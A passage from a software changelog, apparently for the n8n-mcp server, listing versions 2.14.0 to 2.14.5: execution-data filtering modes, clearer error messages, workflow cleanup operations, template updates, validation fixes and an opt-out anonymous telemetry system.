- New error formatting functions in `n8n-errors.ts`:
  - `formatExecutionError()` - Creates execution-specific error messages with debugging guidance
  - `formatNoExecutionError()` - Provides guidance when execution context unavailable
- Enhanced `McpToolResponse` type with optional `executionId` and `workflowId` fields
- Error handling documentation in `n8n-trigger-webhook-workflow` tool docs
- 30 new comprehensive tests for error message formatting and webhook error handling

### Changed
- `handleTriggerWebhookWorkflow` now extracts execution context from error responses
- `getUserFriendlyErrorMessage` returns actual server error messages instead of generic text
- Tool documentation type enhanced with optional `errorHandling` field

### Fixed
- Test expectations updated to match new error message format (handlers-workflow-diff.test.ts)

### Benefits
- **Fast debugging**: Preview mode executes in <50ms (vs seconds for full data)
- **Efficient**: Uses ~500 tokens (vs 50K+ tokens for full execution data)
- **Safe**: No timeout or token limit risks
- **Actionable**: Clear next steps for users to investigate failures

### Impact
- Eliminates unhelpful "contact support" messages
- Provides specific, actionable debugging guidance
- Reduces debugging time by directing users to efficient tools
- 100% backward compatible - only improves error messages

## [2.14.5] - 2025-09-30

### Added
- **Intelligent Execution Data Filtering**: Major enhancement to `n8n_get_execution` tool to handle large datasets without exceeding token limits
  - **Preview Mode**: Shows data structure, counts, and size estimates without actual data (~500 tokens)
  - **Summary Mode**: Returns 2 sample items per node (safe default, ~2-5K tokens)
  - **Filtered Mode**: Granular control with node filtering and custom item limits
  - **Full Mode**: Complete data retrieval (explicit opt-in)
  - Smart recommendations based on data size (guides optimal retrieval strategy)
  - Structure-only mode (`itemsLimit: 0`) to see data schema without values
  - Node-specific filtering with `nodeNames` parameter
  - Input data inclusion option for debugging transformations
  - Automatic size estimation and token consumption guidance

### Enhanced
- `n8n_get_execution` tool with new parameters:
  - `mode`: 'preview' | 'summary' | 'filtered' | 'full'
  - `nodeNames`: Filter to specific nodes
  - `itemsLimit`: Control items per node (0=structure, -1=unlimited, default=2)
  - `includeInputData`: Include input data for debugging
  - Legacy `includeData` parameter mapped to new modes for backward compatibility
- Tool documentation with comprehensive examples and best practices
- Type system with new interfaces: `ExecutionMode`, `ExecutionPreview`, `ExecutionFilterOptions`, `FilteredExecutionResponse`

### Technical Improvements
- New `ExecutionProcessor` service with intelligent filtering logic
- Smart data truncation with metadata (`hasMoreData`, `truncated` flags)
- Validation for `itemsLimit` (capped at 1000, negative values default to 2)
- Error message extraction helper for consistent error handling
- Constants-based thresholds for easy tuning (20/50/100KB limits)
- 33 comprehensive unit tests with 78% coverage
- Null-safe data access throughout

### Performance
- Preview mode: <50ms (no data, just structure)
- Summary mode: <200ms (2 items per node)
- Filtered mode: 50-500ms (depends on filters)
- Size estimation within 10-20% accuracy

### Impact
- Solves token limit issues when inspecting large workflow executions
- Enables AI agents to understand execution data without overwhelming responses
- Reduces token usage by 80-95% for large datasets (50+ items)
- Maintains 100% backward compatibility with existing integrations
- Recommended workflow: preview → recommendation → filtered/summary

### Fixed
- Preview mode bug: Fixed API data fetching logic to ensure preview mode retrieves execution data for structure analysis and recommendation generation
  - Changed `fetchFullData` condition in handlers-n8n-manager.ts to include preview mode
  - Preview mode now correctly returns structure, item counts, and size estimates
  - Recommendations are now accurate and prevent token overflow issues

### Migration Guide
- **No breaking changes**: Existing `n8n_get_execution` calls work unchanged
- New recommended workflow:
  1. Call with `mode: 'preview'` to assess data size
  2. Follow `recommendation.suggestedMode` from preview
  3. Use `mode: 'filtered'` with `itemsLimit` for precise control
- Legacy `includeData: true` now maps to `mode: 'summary'` (safer default)

## [2.14.4] - 2025-09-30

### Added
- **Workflow Cleanup Operations**: Two new operations for `n8n_update_partial_workflow`
  - `cleanStaleConnections`: Automatically removes connections referencing non-existent nodes
  - `replaceConnections`: Replace entire connections object in a single operation
- **Graceful Error Handling**: Enhanced `removeConnection` with `ignoreErrors` flag
- **Best-Effort Mode**: New `continueOnError` mode for `WorkflowDiffRequest`
  - Apply valid operations even if some fail
  - Returns detailed results with `applied` and `failed` operation indices
  - Maintains atomic mode as default for safety

### Enhanced
- Tool documentation for workflow cleanup scenarios
- Type system with new operation interfaces
- 15 new tests covering all new features

### Impact
- Reduces broken workflow fix time from 10-15 minutes to 30 seconds
- Token efficiency: `cleanStaleConnections` is 1 operation vs 10+ manual operations
- 100% backwards compatibility maintained

## [2.14.3] - 2025-09-30

### Added
- Incremental template updates with `npm run fetch:templates:update`
- Smart filtering for new templates (5-10 min vs 30-40 min full rebuild)
- 48 new templates (2,598 → 2,646 total)

### Fixed
- Template metadata generation: Updated to `gpt-4o-mini-2025-08-07` model
- Removed unsupported `temperature` parameter from OpenAI Batch API
- Template sanitization: Added Airtable PAT and GitHub token detection
- Sanitized 24 templates removing API tokens

### Updated
- n8n: 1.112.3 → 1.113.3
- n8n-core: 1.111.0 → 1.112.1
- n8n-workflow: 1.109.0 → 1.110.0
- @n8n/n8n-nodes-langchain: 1.111.1 → 1.112.2
- Node database rebuilt with 536 nodes from n8n v1.113.3

## [2.14.2] - 2025-09-29

### Fixed
- Validation false positives for Google Drive nodes with 'fileFolder' resource
  - Added node type normalization to handle both `n8n-nodes-base.` and `nodes-base.` prefixes correctly
  - Fixed resource validation to properly recognize all valid resource types
  - Default operations are now properly applied when not specified
  - Property visibility is now correctly checked with defaults applied
- Code node validation incorrectly flagging valid n8n expressions as syntax errors
  - Removed overly aggressive regex pattern `/\)\s*\)\s*{/` that flagged valid expressions
  - Valid patterns like `$('NodeName').first().json` are now correctly recognized
  - Function chaining and method chaining no longer trigger false positives
- Enhanced error handling in repository methods based on code review feedback
  - Added try-catch blocks to `getNodePropertyDefaults` and `getDefaultOperationForResource`
  - Validates data structures before accessing to prevent crashes with malformed node data
  - Returns safe defaults on errors to ensure validation continues

### Added
- Comprehensive test coverage for validation fixes in `tests/unit/services/validation-fixes.test.ts`
- New repository methods for better default value handling:
  - `getNodePropertyDefaults()` - retrieves default values for node properties
  - `getDefaultOperationForResource()` - gets default operation for a specific resource

### Changed
- Enhanced `filterPropertiesByMode` to return both filtered properties and config with defaults applied
- Improved node type validation to accept both valid prefix formats

## [2.14.1] - 2025-09-26

### Changed
- **BREAKING**: Refactored telemetry system with major architectural improvements
  - Split 636-line TelemetryManager into 7 focused modules (event-tracker, batch-processor, event-validator, rate-limiter, circuit-breaker, workflow-sanitizer, config-manager)
  - Changed TelemetryManager constructor to private, use `getInstance()` method now
  - Implemented lazy initialization pattern to avoid early singleton creation

### Added
- Security & Privacy enhancements for telemetry:
  - Comprehensive input validation with Zod schemas
  - Enhanced sanitization of sensitive data (URLs, API keys, emails)
  - Expanded sensitive key detection patterns (25+ patterns)
  - Row Level Security on Supabase backend
  - Data deletion contact info (romuald@n8n-mcp.com)
- Performance & Reliability improvements:
  - Sliding window rate limiter (100 events/minute)
  - Circuit breaker pattern for network failures
  - Dead letter queue for failed events
  - Exponential backoff with jitter for retries
  - Performance monitoring with overhead tracking (<5%)
  - Memory-safe array limits in rate limiter
- Comprehensive test coverage enhancements:
  - Added 662 lines of new telemetry tests
  - Enhanced config-manager tests with 17 new edge cases
  - Enhanced workflow-sanitizer tests with 19 new edge cases
  - Improved coverage from 63% to 91% for telemetry module
  - Branch coverage improved from 69% to 87%

### Fixed
- TypeScript lint errors in telemetry test files
  - Corrected variable name conflicts in integration tests
  - Fixed process.exit mock implementation in batch-processor tests
  - Fixed tuple type annotations for workflow node positions
  - Resolved MockInstance type import issues
- Test failures in CI pipeline
  - Fixed test timeouts caused by improper fake timer usage
  - Resolved Timer.unref() compatibility issues
  - Fixed event validator filtering standalone 'key' property
  - Corrected batch processor circuit breaker behavior
- TypeScript error in telemetry test preventing CI build
- Added @supabase/supabase-js to Docker builder stage and runtime dependencies

## [2.14.0] - 2025-09-26

### Added
- Anonymous telemetry system with Supabase integration to understand usage patterns
  - Tracks active users with deterministic anonymous IDs
  - Records MCP tool usage frequency and error rates
  - Captures sanitized workflow structures on successful validation
  - Monitors common error patterns for improvement insights
  - Zero-configuration design with opt-out support via N8N_MCP_TELEMETRY_DISABLED environment variable

- Enhanced telemetry tracking methods:
  - `trackSearchQuery` - Records search patterns and result counts
  - `trackValidationDetails` - Captures validation errors and warnings
  - `trackToolSequence` - Tracks AI agent tool usage sequences
  - `trackNodeConfiguration` - Records common node configuration patterns
  - `trackPerformanceMetric` - Monitors operation performance

- Privacy-focused workflow sanitization:
  - Removes all sensitive data (URLs, API keys, credentials)
  - Generates workflow hashes for deduplication
  - Preserves only structural information

- Comprehensive test coverage for telemetry components (91%+ coverage)

### Fixed
- Fixed TypeErrors in `get_node_info`, `get_node_essentials`, and `get_node_documentation` tools that were affecting 50% of calls
- Added null safety checks for undefined node properties
- Fixed multi-process telemetry issues with immediate flush strategy
- Resolved RLS policy and permission issues with Supabase

### Changed
- Updated Docker configuration to include Supabase client for telemetry support
- Enhanced workflow validation tools to track validated workflows
- Improved error handling with proper null coalescing operators

### Documentation
- Added PRIVACY.md with comprehensive privacy policy
- Added telemetry configuration instructions to README
- Updated CLAUDE.md with telemetry system architecture

## Previous Versions

For changes in previous versions, please refer to the git history and release notes.